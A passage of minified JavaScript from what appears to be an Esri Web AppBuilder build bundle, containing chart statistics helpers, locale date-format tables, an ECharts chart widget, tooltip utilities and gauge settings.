n.hitch(this,function(a){return this._isFloatNumberField(a)})),d={};g.forEach(e,n.hitch(this,function(a){d[a]=[]}));b&&0<b.length&&g.forEach(b,n.hitch(this,function(a){var c=a.attributes;c&&g.forEach(e,n.hitch(this,function(a){var b=c[a];"number"===typeof b&&d[a].push(b)}))}));g.forEach(e,n.hitch(this,function(a){this.floatNumberFieldDecimalPlace[a]=0;var c=d[a];if(0<c.length)try{var b=this._getBestDecimalPlace(c);this.floatNumberFieldDecimalPlace[a]=b}catch(w){this.floatNumberFieldDecimalPlace[a]=
0,console.error(w)}this.popupFieldInfosObj&&(c=this._getFormatFromPopupInfo(this.popupFieldInfosObj,a))&&0<=c.places&&(this.floatNumberFieldDecimalPlace[a]=c.places)}))},_getFormatFromPopupInfo:function(a,b){var c=null;if(!a)return c;(a=a.fieldInfos)&&0<a.length&&a.forEach(function(a){a.fieldName===b&&(c=a.format)});return c},_getFloatNumberFieldDecimalPlace:function(a){var c=0;this.floatNumberFieldDecimalPlace&&(a=this.floatNumberFieldDecimalPlace[a],"number"===typeof a&&(c=a));return c},_getBestValueForFloatNumberField:function(a,
b){if(null===a)return a;b=this._getFloatNumberFieldDecimalPlace(b);a=a.toFixed(b);return parseFloat(a)},_getBestValueForIntegerFieldAverage:function(a,b){if("number"!==typeof a)return a;var c=0,e=a.toString().split(".");1===e.length?c=0:2===e.length&&(c=e[1].length);return 0<c?(c>b&&(c=b),a=a.toFixed(c),parseFloat(a)):a},getFeatureModeStatisticsInfo:function(a){var c=a.features,b=a.labelField,d=a.valueFields,h=a.sortOrder;a=a.maxLabels;var p=[],c=c.filter(function(a){var c=a.attributes[b];if(c||"number"===
typeof c)return!0;p.push(a)}).concat(p),c=this._sortStatisticsInfo(c,"feature",h,b),h=[],h=g.map(c,n.hitch(this,function(a){var c=a.attributes;a={category:c[b],valueFields:[],dataFeatures:[a]};a.valueFields=g.map(d,n.hitch(this,function(a){return c[a]}));return a}));0<h.length&&h.forEach(n.hitch(this,function(a){var c=a.category;a.originValue=c;a.category=this._getBestDisplayValue(b,c)}));return this._getDataForMaxLabels(h,a)},getCategoryModeStatisticsInfo:function(a){function c(a){var c=[],e=null,
d;for(d in a)e=a[d],this._isNumberField(h)&&"number"===typeof d&&k.isDefined(d)&&(d=parseFloat(d)),e.fieldsValues=g.map(p,n.hitch(this,function(a){var c=a;if(b){var d=m;"average"===d&&(d="avg");/(_sum$)|(_avg$)|(_min$)|(_max$)/g.test(c)||(c=c+"_"+d)}var d=g.map(e.dataFeatures,n.hitch(this,function(a){return a.attributes[c]})),f;if(0!==d.length){f=0;"max"===m?f=-Infinity:"min"===m&&(f=Infinity);var d=r?d.map(function(a){this._isNumber(a)||(a=0);return a}.bind(this)):d.filter(function(a){return this._isNumber(a)}.bind(this)),
l=0;g.forEach(d,n.hitch(this,function(a){l++;"average"===m||"sum"===m?f+=a:"max"===m?f=Math.max(f,a):"min"===m&&(f=Math.min(f,a))}));0<l?"average"===m&&(f/=l):f=null}else f=null;return{field:a,value:f}})),e.valueFields=g.map(e.fieldsValues,function(a){return a.value}),c.push({originValue:e.originValue,category:d,valueFields:e.valueFields,fieldsValues:e.fieldsValues,dataFeatures:e.dataFeatures});return c}var b=a.forServer,d=a.features,h=a.categoryField,p=a.valueFields,m=a.operation,B=a.sortOrder,w=
a.maxLabels,r=a.nullValue,u=a.splitField,t=[],t=this.getCategoryOrCountHashObj(h,d,a.dateConfig);a=t.nullLabelHashObj;t=c.call(this,t.notNullLabelHashObj);a=c.call(this,a);t=t.concat(a);u&&t.forEach(function(a){var b=this.getCategoryOrCountHashObj(u,a.dataFeatures),e=c.call(this,b.notNullLabelHashObj),b=c.call(this,b.nullLabelHashObj),e=e.concat(b).map(function(a){return{field:a.category,originField:a.originValue,value:a.valueFields[0]}});a.splitedValueFields=e}.bind(this));t=this._sortStatisticsInfo(t,
"category",B);t=g.filter(t,n.hitch(this,function(a){var c=!1;a=a.category;"number"===typeof a&&(c=isNaN(a));return!c}));this._calculateDecimalPlaceForFloatField({categoryField:h,valueFields:p},d);"sum"!==m&&"average"!==m||g.forEach(t,n.hitch(this,function(a){g.forEach(p,n.hitch(this,function(c,b){var e=a.valueFields[b];this._isFloatNumberField(c)?(e=this._getBestValueForFloatNumberField(e,c),a.valueFields[b]=e):this._isIntegerNumberField(c)&&"average"===m&&(e=a.valueFields[b],e=this._getBestValueForIntegerFieldAverage(e,
6),a.valueFields[b]=e)}))}));return this._getDataForMaxLabels(t,w)},getCountModeStatisticsInfo:function(a){function c(a){var c=[],e=null,d;for(d in a)e=a[d],this._isNumberField(b)&&"number"===typeof d&&(d=parseFloat(d)),c.push({originValue:e.originValue,fieldValue:d,count:e.count,dataFeatures:e.dataFeatures});return c}var b=a.categoryField,d=a.sortOrder,h=a.maxLabels,p=a.splitField,k=[],k=this.getCategoryOrCountHashObj(b,a.features,a.dateConfig);a=k.nullLabelHashObj;k=c.call(this,k.notNullLabelHashObj);
a=c.call(this,a);k=k.concat(a);p&&k.forEach(function(a){var b=this.getCategoryOrCountHashObj(p,a.dataFeatures),b=b.notNullLabelHashObj,b=c.call(this,b).map(function(a){return{field:a.fieldValue,originField:a.originValue,value:a.count}});a.splitedValueFields=b}.bind(this));k=this._sortStatisticsInfo(k,"count",d);return this._getDataForMaxLabels(k,h)},getFieldModeStatisticsInfo:function(a){var c=a.forServer,b=a.features,d=a.valueFields,h=a.operation,p=a.sortOrder,k=a.maxLabels,m=a.nullValue,w=g.map(b,
n.hitch(this,function(a){return a.attributes})),r={};g.forEach(d,n.hitch(this,function(a){var b=a;if(c){var e=h;"average"===e&&(e="avg");/(_sum$)|(_avg$)|(_min$)|(_max$)/g.test(b)||(b=b+"_"+e)}r[a]=0;"max"===h?r[a]=-Infinity:"min"===h&&(r[a]=Infinity);var e=w.map(function(a){return a[b]}),d=0,e=m?e.map(function(a){this._isNumber(a)||(a=0);return a}.bind(this)):e.filter(function(a){return this._isNumber(a)}.bind(this));g.forEach(e,n.hitch(this,function(c){d++;r.hasOwnProperty(a)?"average"===h||"sum"===
h?r[a]+=c:"max"===h?r[a]=Math.max(r[a],c):"min"===h&&(r[a]=Math.min(r[a],c)):r[a]=c}));0<d?"average"===h&&(r[a]/=d):r[a]=null}));this._calculateDecimalPlaceForFloatField({valueFields:d},b);"sum"!==h&&"average"!==h||g.forEach(d,n.hitch(this,function(a){var c=r[a];r.hasOwnProperty(a)&&this._isFloatNumberField(a)?r[a]=this._getBestValueForFloatNumberField(c,a):r.hasOwnProperty(a)&&this._isIntegerNumberField(a)&&"average"===h&&(r[a]=this._getBestValueForIntegerFieldAverage(c,6))}));a=[];for(var u in r)r.hasOwnProperty(u)&&
a.push({label:u,value:r[u]});a=this._sortStatisticsInfo(a,"field",p);return this._getDataForMaxLabels(a,k)},_getDataForMaxLabels:function(a,b){return"number"===typeof b&&0<=b&&b<a.length?a.slice(0,b):a},_sortStatisticsInfo:function(a,b,d,h){function c(a,c,b){var d;"category"===c?b.isLabelAxis?b.isLabelAxis&&(d=a.originValue):b.field||1!==a.fieldsValues.length?a.fieldsValues.forEach(function(a){b.field===a.field&&(d=a.value)}):d=a.fieldsValues[0].value:"count"===c?(c=a.originValue,d=b.isLabelAxis?
c:a.count):"field"===c?d=b.isLabelAxis?a.label:a.value:"feature"===c&&(d=b.isLabelAxis?a.attributes[h]:a.attributes[b.field]);return d}if(!d)return a;var e=d.isAsc;if(!Array.isArray(a))return a;a.sort(function(a,l){a=c(a,b,d);l=c(l,b,d);a||"number"===typeof a||(a=Infinity);l||"number"===typeof l||(l=Infinity);var h=0,h=(a>l?e:!e)?1:-1;a===l&&(h=0);return h});return a},_getDateUnit:function(a,b){var c=b;"automatic"===b&&(b=d(a[0]).local(),a=d(a[1]).local(),a=Math.round(a.diff(b,"minute",!0)),0<=a&&
1>=a?c="second":1<a&&60>=a?c="minute":60<a&&1440>=a?c="hour":1440<a&&43200>=a?c="day":43200<a&&518400>=a?c="month":518400<a&&(c="year"));return c},_getTimeRange:function(a,b){var c=a.map(n.hitch(this,function(a){return a.attributes[b]})),c=c.filter(function(a){return!!a});a=Math.min.apply(Math,c);c=Math.max.apply(Math,c);return[a,c]},_getTimeTwixs:function(a,b,l){if(0>"year month day hour minute second automatic".split(" ").indexOf(l))return console.log("Invaild data formatter: "+l),!1;a=this._getTimeRange(a,
b);if(a[0]===a[1])return!1;l=this._getDateUnit(a,l);b=this._getIntegerDateByUnit(a[0],l);b=d(b).local();a=d(a[1]).local();a=b.twix(a).split(1,l);b={startValue:a[a.length-1].end().valueOf(),endValue:Infinity};a.push(b);return{twixs:a,dateUnit:l}},_getIntegerDateByUnit:function(a,b){var c=d(a),e=c.year(),h=c.month(),p=c.date(),k=c.hour(),g=c.minute(),c=c.second();switch(b){case "year":a=d({year:e}).valueOf();break;case "month":a=d({year:e,month:h}).valueOf();break;case "day":a=d({year:e,month:h,day:p}).valueOf();
break;case "hour":a=d({year:e,month:h,day:p,hour:k}).valueOf();break;case "minute":a=d({year:e,month:h,day:p,hour:k,minute:g}).valueOf();break;case "second":a=d({year:e,month:h,day:p,hour:k,minute:g,second:c}).valueOf()}return a},_getDateCategory:function(a,b){return b?this._getFormatteredDate(a,b):a},_getFormatteredDate:function(a,b){var c=this._getDateTemplate(b);0<=["year","month","day"].indexOf(b)?c=h.localizeDate(new Date(a),{selector:"date",datePattern:c.date}):(b=h.localizeDate(new Date(a),
{selector:"date",datePattern:c.date}),a=d(a).format(c.time),c=b+c.connector+a);return c},_getDateTemplate:function(c){var d=a[b.locale];(d=d||{},d.date)||(d.date={"short":"short"});d&&!d.time&&(d.time={medium:"HH:mm:ss a"});d&&!d.connector&&(d.connector=" ");d&&!d.sNoDay&&(d.sNoDay="MMM, y");var h={};"year"===c?h.date="y":"month"===c?h.date=d.date.sNoDay:"day"===c?h.date=d.date["short"]:"hour"===c?(h.date=d.date["short"],h.time="HH a",h.connector=d.connector):"minute"===c?(h.date=d.date["short"],
h.time="HH:mm a",h.connector=d.connector):"second"===c&&(h.date=d.date["short"],h.time=d.time.medium,h.connector=d.connector);return h},getCategoryOrCountHashObj:function(a,b,d){function c(a,b,c,d){var e=a[0].attributes[b];b="automatic"!==d.minPeriod?this._getDateCategory(e,d.minPeriod):this._getBestDisplayValue(b,e);a={count:1,dataFeatures:a};a.originValue=e;c[b]=a;return c}function e(a,b,c,d){a[b]?(a=a[b],a.count+=d.count,a.dataFeatures=a.dataFeatures.concat(d.dataFeatures)):(d.originValue=c,a[b]=
d)}function h(a,b){var c={};g.forEach(a,n.hitch(this,function(a){var d=a.attributes,e=this._getBestDisplayValue(b,d[b]),h=null;c.hasOwnProperty(e)?(h=c[e],h.dataFeatures.push(a),h.count++):(h={count:1,dataFeatures:[a]},h.originValue=d[b],c[e]=h)}));return c}var l=[],k=b.filter(function(b){var c=b.attributes[a];if(c||"number"===typeof c)return!0;l.push(b)}),m={};b={};if(d)if(1===k.length)m=c.call(this,k,a,m,d);else{if(0!==k.length)if(b=this._getTimeTwixs(k,a,d.minPeriod)){var r=b.dateUnit;b.twixs.forEach(function(b){var c=
"undefined"!==typeof b.startValue?b.startValue:b.start().valueOf(),h="undefined"!==typeof b.endValue?b.endValue:b.end().valueOf();b=this._getDateCategory(c,r);var l={count:0,dataFeatures:[]};g.forEach(k,n.hitch(this,function(b){var d=b.attributes[a];d>=c&&d<h&&(l.dataFeatures.push(b),l.count++)}));d.isNeedFilled?e.call(this,m,b,c,l):0<l.count&&e.call(this,m,b,c,l)}.bind(this))}else m=c.call(this,k,a,m,d)}else m=h.call(this,k,a);b=h.call(this,l,a);return{notNullLabelHashObj:m,nullLabelHashObj:b}}});
return{getFeatureModeStatisticsInfo:function(a){return(new m({layerDefinition:a.layerDefinition,popupFieldInfosObj:a.popupFieldInfosObj})).getFeatureModeStatisticsInfo(a)},getCategoryModeStatisticsInfo:function(a){return(new m({layerDefinition:a.layerDefinition,popupFieldInfosObj:a.popupFieldInfosObj})).getCategoryModeStatisticsInfo(a)},getCountModeStatisticsInfo:function(a){return(new m({layerDefinition:a.layerDefinition,popupFieldInfosObj:a.popupFieldInfosObj})).getCountModeStatisticsInfo(a)},getFieldModeStatisticsInfo:function(a){return(new m({layerDefinition:a.layerDefinition})).getFieldModeStatisticsInfo(a)}}})},
"jimu/_dateFormat":function(){define([],function(){return{ar:{date:{"short":"d/M/y",medium:"dd/MM/y","long":"d MMMM. y",onlyDate:"dd/MM",mNoDay:"MM/y",sNoDay:"M/y"},time:{"short":"h:mm a",medium:"h:mm:ss a"}},bs:{date:{"short":"d.M.yy.",medium:"d. MMM. y.","long":"d. MMMM y.",onlyDate:"d. MMM.",mNoDay:"MMM. y.",sNoDay:"M.yy"}},cs:{date:{"short":"dd.MM.yy",medium:"d. M. y",onlyDate:"d. M.",mNoDay:"M. y",sNoDay:"MM.yy"}},da:{date:{"short":"dd/MM/y",medium:"d. MMM y","long":"d. MMMM y",onlyDate:"d. MMM",
mNoDay:"MMM y",sNoDay:"MM/y"}},de:{date:{"short":"dd.MM.yy",medium:"dd.MM.y",onlyDate:"dd.MM."},connector:" , ",mNoDay:"MM.y",sNoDay:"MM.yy"},el:{date:{"short":"d/M/yy",medium:"d MMM y",onlyDate:"d MMM"},connector:" , ",mNoDay:"MMM y",sNoDay:"M/yy"},en:{date:{"short":"M/d/yy",medium:"MMM d, y",onlyDate:"MMM d",mNoDay:"MMM, y",sNoDay:"M/yy"}},es:{date:{"short":"d/M/yy",medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"M/yy"}},et:{date:{"short":"d.MM.y",medium:"d. MMM y",onlyDate:"d. MMM",mNoDay:"MMM y",
sNoDay:"MM.y"},time:{"short":"H:mm",medium:"H:mm:ss"}},fi:{date:{"short":"d.M.y",medium:"d.M.y",onlyDate:"d.M.",mNoDay:"M.y",sNoDay:"M.y"},connector:" 'klo' "},fr:{date:{"short":"dd/MM/y",medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM/y"},connector:" '\u00e0' "},he:{date:{"short":"dd/MM/yy",medium:"d '\u05d1'MMM y",onlyDate:"d '\u05d1'MMM",mNoDay:"'\u05d1'MMM y",sNoDay:"MM/yy"},connector:" , "},hi:{date:{"short":"d/M/yy",medium:"dd/MM/y","long":"d MMMM y",onlyDate:"dd/MM",mNoDay:"MM/y",
sNoDay:"M/yy"},time:{"short":"h:mm a",medium:"h:mm:ss a",sNoDay:""},connector:" , "},hr:{date:{"short":"d.M.y",medium:"d. MMM y.",onlyDate:"d. MMM",mNoDay:"MMM y.",sNoDay:"M.y"}},id:{"short":"dd/MM/yy",date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM/yy"}},it:{date:{medium:"dd MMM y","long":"d MMMM y",onlyDate:"dd MMM",mNoDay:"MMM y",sNoDay:"MM/yy"},connector:" , "},ja:{date:{medium:"y/MM/dd",onlyDate:"MM/dd",mNoDay:"y/MM",sNoDay:"y/MM"},time:{"short":"a h:mm",medium:"a h:mm:ss"}},
ko:{date:{medium:"y. M. d.",onlyDate:"M. d.",mNoDay:"y. M.",sNoDay:"yy. M."}},lt:{date:{medium:"y-MM-dd","long":"y 'm'. MMMM d 'd'.",onlyDate:"MM-dd",mNoDay:"y-MM",sNoDay:"y-MM"},time:{medium:"HH:mm:ss"}},lv:{date:{"short":"dd.MM.y",medium:"y. 'gada' d. MMM.","long":"y. 'gada' d. MMMM",onlyDate:"d. MMM.",mNoDay:"y. 'gada' MMM.",sNoDay:"MM.y"}},nb:{date:{"short":"dd.MM.y",medium:"d. MMM y","long":"d. MMMM y",onlyDate:"d. MMM",mNoDay:"MMM y",sNoDay:"MM.y"},time:{"short":"HH:mm",medium:"HH:mm:ss"},connector:" , "},
nl:{date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM-yy"}},pl:{date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM.y"},connector:" , "},"pt-br":{date:{"short":"dd/MM/y",medium:"d 'de' MMM 'de' y",onlyDate:"d 'de' MMM",mNoDay:"MMM 'de' y",sNoDay:"MM/y"}},"pt-pt":{date:{medium:"dd/MM/y",onlyDate:"dd/MM",mNoDay:"MM/y",sNoDay:"MM/yy"}},ro:{date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM.y"},connector:" , "},ru:{date:{"short":"dd.MM.y",medium:"d MMM y '\u0433.'",
onlyDate:"d MMM",mNoDay:"MMM y '\u0433.'",sNoDay:"MM.y"},connector:" , "},sr:{date:{medium:"dd.MM.y.",onlyDate:"dd.MM.",mNoDay:"MM.y.",sNoDay:"M.yy."},time:{"short":"HH:mm",medium:"HH:mm:ss"}},sv:{date:{medium:"d MMM. y",onlyDate:"d MMM.",mNoDay:"MMM. y",sNoDay:"y-MM"}},th:{date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"M/yy"}},tr:{date:{medium:"d MMM y",onlyDate:"d MMM",mNoDay:"MMM y",sNoDay:"MM.y"}},vi:{date:{"short":"dd/MM/y",medium:"d MMM, y","long":"'Ng\u00e0y' dd 'th\u00e1ng' MM 'n\u0103m' y",
onlyDate:"d MMM",mNoDay:"MMM, y",sNoDay:"MM/y"},time:{"short":"hh:mm a",medium:"hh:mm:ss a"},connector:" , "},"zh-cn":{date:{"short":"y/M/d",medium:"y'\u5e74'M'\u6708'd'\u65e5'",onlyDate:"M'\u6708'd'\u65e5'",mNoDay:"y'\u5e74'M'\u6708'",sNoDay:"y/M"}},"zh-hk":{date:{medium:"y'\u5e74'M'\u6708'd'\u65e5'",onlyDate:"M'\u6708'd'\u65e5'",mNoDay:"y'\u5e74'M'\u6708'",sNoDay:"M/y"}},"zh-tw":{date:{medium:"y'\u5e74'M'\u6708'd'\u65e5'",onlyDate:"M'\u6708'd'\u65e5'",mNoDay:"y'\u5e74'M'\u6708'",sNoDay:"y/M"}}}})},
"jimu/dijit/Chart":function(){define("dojo/_base/declare dijit/_WidgetBase dojo/_base/lang dojo/_base/html dojo/Evented libs/echarts/echarts jimu/utils ./_chartUtils ./_Gauge ./_ChartOptionFactory libs/echarts/light libs/echarts/dark".split(" "),function(q,g,n,b,a,d,h,k,m,c){return q([g,a],{baseClass:"jimu-dijit-chart",templateString:"\x3cdiv\x3e\x3c/div\x3e",declaredClass:"jimu.dijit.chart",config:null,validConfig:{type:"column bar line pie radar funnel gauge".split(" "),common:"type title labels legend confine toolbox color theme backgroundColor scale dataZoom events series advanceOption".split(" "),
axisChart:["stack","axisPointer","hidexAxis","hideyAxis","area"],pie:["labelLine","pieMode","roseType","innerRadius"],funnel:["min","max","funnelSort"],gauge:["shape","min","max","gaugeOption"],radar:["radarShape","indicator"]},postCreate:function(){this.inherited(arguments);var a=this._getChartBox(this.chartDom);b.setStyle(this.domNode,{width:a.w+"px",height:a.h+"px"});this.chart=d.init(this.domNode,this.config.theme||"light");this.gauge=new m({chart:this.chart});this.chartOptionFactory=new c({chart:this.chart,
gauge:this.gauge});this.setConfig()},updateConfig:function(a){if(!a)return!1;this.config=n.mixin(this.config,a);a=this._chartFactory(this.config);this.chart.setOption(a,!0);"gauge"===this.config.type&&"curved"!==this.config.shape&&this.gauge._resetGraphic(this.config);return!0},setConfig:function(a){this.config=a?a:this.config||{};if(!this._checkConfig(this.config))return!1;this._customTheme();this.clear();this.chart.setOption(this._chartFactory(this.config));this._resizeGridAndGraphicOfGauge();return!0},
destroy:function(){this.config.events&&this.config.events[0]&&this.config.events.forEach(n.hitch(this,function(a){this.chart.off(a.name)}));this.chart.clear();this.inherited(arguments)},_showInitChart:function(a){var b;b="column"===a.type||"horizontal"===a.shape||"vertical"===a.shape?"bar":a.type;var c={series:[{data:[{name:"0",value:0}]}]};k.isAxisChart(a)&&(c.xAxis={data:["0"]},c.yAxis={});c.series[0].type=b;this.chart.setOption(c,!1)},_chartFactory:function(a){a.shape||this._showInitChart(a);this.option=
this.chartOptionFactory.produceOption(a);this._bindEvents(a);return this.option},clear:function(){this.chart.clear()},resize:function(a,c){b.setStyle(this.domNode,{width:a||"100%",height:c||"100%"});this.chart.resize();this._resizeDataZoom();this._resizeGridAndGraphicOfGauge()},_getChartBox:function(){var a={w:10,h:10};if(this.chartDom){var c=b.getMarginBox(this.chartDom);0!==c.w&&(a.w=c.w);0!==c.h&&(a.h=c.h)}return a},_resizeDataZoom:function(){var a=this.option,a=this.chartOptionFactory.settingDataZoom(a,
this.config);this.chart.setOption(a)},_bindEvents:function(a){a.events&&a.events[0]&&a.events.forEach(n.hitch(this,function(a){this.chart.on(a.name,a.callback)}))},_resizeGridAndGraphicOfGauge:function(){"gauge"===this.config.type&&"curved"!==this.config.shape&&(this.gauge._resetGrid(this.config),this.gauge._resetGraphic(this.config))},_customTheme:function(){this.chart._theme||(this.chart._theme={});this.chart._theme.tooltip||(this.chart._theme.tooltip={});this.config.confine&&(this.chart._theme.tooltip.confine=
!0);this.chart._theme.tooltip.axisPointer={type:"cross",label:{show:!0,precision:2,formatter:function(a){return"number"===typeof a.value?(a=parseFloat(a.value).toFixed(2),k.tryLocaleNumber(a)):a.value}},lineStyle:{color:"#27727B",type:"dashed"},crossStyle:{color:"#27727B"},shadowStyle:{color:"rgba(200,200,200,0.3)"}};this.chart._theme.valueAxis||(this.chart._theme.valueAxis={});this.chart._theme.valueAxis.axisLabel||(this.chart._theme.valueAxis.axisLabel={});this.chart._theme.valueAxis.axisLabel.formatter=
function(a){return h.localizeNumber(a)}},_checkConfig:function(a){var b=!0;a||(console.error("Empty config"),b=!1);if(!a.type||0>this.validConfig.type.indexOf(a.type))console.error("Invaild chart type!"),b=!1;var c=n.clone(this.validConfig),d=c.common,e=[],e="column"===a.type||"bar"===a.type||"line"===a.type?d.concat(c.axisChart):d.concat(c[a.type]);Object.keys(a).forEach(function(a){0>e.indexOf(a)&&(b=!1,console.error("Invalid configuration parameter: "+a))});return b}})})},"jimu/dijit/_chartUtils":function(){define(["jimu/utils",
"esri/lang","dojo/_base/config"],function(q,g){return{tryLocaleNumber:function(n){var b=n;if(g.isDefined(n)&&isFinite(n))try{var a=q.localizeNumber(n);"string"===typeof a&&(b=a)}catch(d){console.error(d)}return b+""},isAxisChart:function(g){return"column"===g.type||"bar"===g.type||"line"===g.type},getAxisZeroPosition:function(g){if(!this.chart)return!1;var b={},a=0,d=0;if((q.isNotEmptyObject(g.dataZoom,!0)||g.scale)&&g.series&&g.series[0]&&g.series[0].data){var h=g.series[0].data;q.isNotEmptyObject(h,
!0)&&("bar"!==g.type?d=q.getMinOfArray(h):a=q.getMinOfArray(h))}if(g=this.chart.convertToPixel({xAxisIndex:0,yAxisIndex:0},[a,d]))a=g[1]-5,b.left=g[0]-5,b.top=a;return q.isNotEmptyObject(b)?b:!1},_getDisplayValue:function(g,b){g=this.tryLocaleNumber(g);"number"===typeof Number(g)&&b&&(g=(100*g).toFixed(2),g+="%");return g},generateToolTip:function(g,b,a,d,h){var k="",k=a?'\x3cdiv class\x3d"tooltip-tr reverse"\x3e':'\x3cdiv class\x3d"tooltip-tr"\x3e';a='\x3cdiv class\x3d"colorEl marginRight5" style\x3d"background-color:'+
q.encodeHTML(g.color)+'"\x3e\x3c/div\x3e';k+=a;a="";"radar"!==g.seriesType&&this._isVaildValue(g.seriesName)?a=g.seriesName:this._isVaildValue(h)&&(a=h);k=""===a?k+("\x3cdiv\x3e"+a+"\x3c/div\x3e"):k+("\x3cdiv\x3e"+a+"\x3c/div\x3e\x3cdiv\x3e : \x3c/div\x3e");k=this._isNotZeroBoolean(b)?k+("\x3cdiv\x3e"+this._getDisplayValue(b,d)+"\x3c/div\x3e"):this._isVaildValue(g.value)?k+("\x3cdiv\x3e"+this._getDisplayValue(g.value,d)+"\x3c/div\x3e"):k+"\x3cdiv\x3enull\x3c/div\x3e";"pie"===g.seriesType&&(k+='\x3cdiv class\x3d"space-left"\x3e('+
g.percent+"%)\x3c/div\x3e");return k+"\x3c/div\x3e"},handleToolTip:function(g,b,a,d,h){var k='\x3cdiv class\x3d"tooltip-div"\x3e';Array.isArray(g)||(g=[g]);this._isVaildValue(g[0].name)&&(k+='\x3cdiv class\x3d"tr"\x3e'+g[0].name+"\x3c/div\x3e");g.forEach(function(g){k="radar"!==g.seriesType?k+this.generateToolTip(g,b,a,d,h):k+this._handleRadarTooltip(g,a,d,h)}.bind(this));return k+="\x3c/div\x3e"},_handleRadarTooltip:function(g,b,a,d){var h="";(g.value||[]).forEach(function(k,m){h+=this.generateToolTip(g,
k,b,a,d[m])}.bind(this));return h},_isVaildValue:function(g){var b=!0;"%00-"===encodeURI(g)?b=!1:g||"number"===typeof g||(b=!1);return b},_isNotZeroBoolean:function(g){return 0===g?!0:!!g}}})},"jimu/dijit/_Gauge":function(){define(["dojo/_base/declare","dojo/_base/lang","jimu/utils","./_chartUtils"],function(q,g,n,b){return q([],{curvedGaugeSeries:[{type:"gauge",center:["50%","60%"],startAngle:200,endAngle:-20,axisLine:{lineStyle:{color:[[.31,"#58f7f3"],[1,"#E5E5E5"]]}},axisTick:{show:!1},splitLine:{show:!1},
axisLabel:{distance:-52,textStyle:{color:"#000"}},pointer:{length:"65%",width:5},itemStyle:{normal:{}},detail:{show:!0,offsetCenter:[0,"60%"],textStyle:{color:"#24B5CC"}},title:{show:!1},data:[{value:0}],animationEasingUpdate:"bounceOut",animationDurationUpdate:500}],horizontalGauge:{grid:{top:"middle",height:90},xAxis:{show:!0,offset:-27,type:"value",scale:!1,interval:1,axisTick:{show:!1},axisLine:{show:!1},axisLabel:{show:!1,showMinLabel:!0,showMaxLabel:!0,textStyle:{color:"#949494",fontStyle:"normal",
fontWeight:"normal",fontFamily:"Avenir Next",fontSize:12}},splitLine:{show:!1}},yAxis:{show:!1,type:"category",data:[]},series:[{name:"",type:"bar",barWidth:30,silent:!0,animation:!1,itemStyle:{normal:{color:"#E5E5E5"}},barGap:"-100%",data:[100],z:1},{type:"bar",barWidth:30,label:{normal:{show:!0,position:"top",offset:[20,0],textStyle:{}}},data:[{value:40,label:{normal:{textStyle:{color:"#24B5CC",fontStyle:"normal",fontWeight:"normal",fontFamily:"Avenir Next",fontSize:12}}},itemStyle:{normal:{}}}],
itemStyle:{normal:{color:"#24B5CC"}},z:10}]},verticalGauge:{grid:{left:"middle",width:60},yAxis:{show:!0,offset:-10,type:"value",interval:1,scale:!1,axisTick:{show:!1},axisLine:{show:!1},axisLabel:{show:!1,showMinLabel:!0,showMaxLabel:!0,textStyle:{color:"#949494",fontStyle:"normal",fontWeight:"normal"}},splitLine:{show:!1}},xAxis:{show:!1,type:"category",data:[]},series:[{name:"",type:"bar",barWidth:30,silent:!0,animation:!1,itemStyle:{normal:{color:"#E5E5E5"}},barGap:"-100%",data:[100],z:1},{type:"bar",
barWidth:30,label:{normal:{show:!0,position:"insideTopLeft",offset:[30,-15],textStyle:{}}},data:[{value:40,label:{normal:{textStyle:{color:"#24B5CC",fontStyle:"normal",fontWeight:"normal",fontFamily:"Avenir Next",fontSize:12}}},itemStyle:{normal:{}}}],itemStyle:{normal:{color:"#24B5CC"}},z:10}]},constructor:function(a){this.chart=a.chart},_settingValueStyle:function(a,b){if(b.gaugeOption&&n.isNotEmptyObject(b.gaugeOption.valueStyle)){var d=b.gaugeOption.valueStyle,k=d.textStyle,d=d.formatter;"horizontal"===
b.shape||"vertical"===b.shape?(g.mixin(a.series[1].data[0].label.normal.textStyle,k),d&&(a.series[1].data[0].label.normal.formatter=d)):"curved"===b.shape&&(g.mixin(a.series[0].detail.textStyle,k),d&&(a.series[0].detail.formatter=d))}return a},_settingLabelColor:function(a,b){var d="#000";b.gaugeOption&&b.gaugeOption.labelColor&&(d=b.gaugeOption.labelColor);"curved"===b.shape?a.series[0].axisLabel.textStyle.color=d:"horizontal"===b.shape?a.xAxis.axisLabel.textStyle.color=d:"vertical"===b.shape&&(a.yAxis.axisLabel.textStyle.color=
d);return a},_settingHorizontalGauge:function(a,b){g.mixin(a,g.clone(this.horizontalGauge));a.grid={top:"middle",height:90,left:"10%",right:"10%"};b.min="undefined"!==typeof b.min&&b.min?b.min:0;b.max="undefined"!==typeof b.max&&b.max?b.max:100;a.xAxis.max=b.max;a.xAxis.min=b.min;a.xAxis.scale=!0;a.series[0].data[0]=b.max;a=this._handleValue(a,b);b.labels&&b.labels[0]&&(a.series[1].data[0].name=b.labels[0]);a.series[1].name=b.series[0].name;a=this._settingNoCurvedGaugeColor(a,b);return a=this._handleHorizontalGaugeValueRTL(a,
b)},_handleHorizontalGaugeValueRTL:function(a,b){if(!window.isRTL||"horizontal"!==b.shape)return a;a.series[1].label.normal.offset=[-20,0];return a},_settingVerticalGauge:function(a,b){g.mixin(a,g.clone(this.verticalGauge));a.grid={left:"middle",width:60,top:"10%",bottom:"10%"};a.grid.left=this._getGridLeftOfVerticalGauge();b.min="undefined"!==typeof b.min&&b.min?b.min:0;b.max="undefined"!==typeof b.max&&b.max?b.max:100;a.yAxis.max=b.max;a.yAxis.min=b.min;a.series[0].data[0]=b.max;a=this._handleValue(a,
b);b.labels&&b.labels[0]&&(a.series[1].data[0].name=b.labels[0]);a.series[1].name=b.series[0].name;a=this._settingNoCurvedGaugeColor(a,b);return a=this._handleVerticalGaugeValueRTL(a,b)},_handleVerticalGaugeValueRTL:function(a,b){if(!window.isRTL||"vertical"!==b.shape)return a;var d=(b.series[0].data[0]+"").length-1;b.gaugeOption&&b.gaugeOption.valueStyle&&"undefined"!==typeof b.gaugeOption.valueStyle.decimalPlaces&&(d+=b.gaugeOption.valueStyle.decimalPlaces);a.series[1].label.normal.offset=[-17-
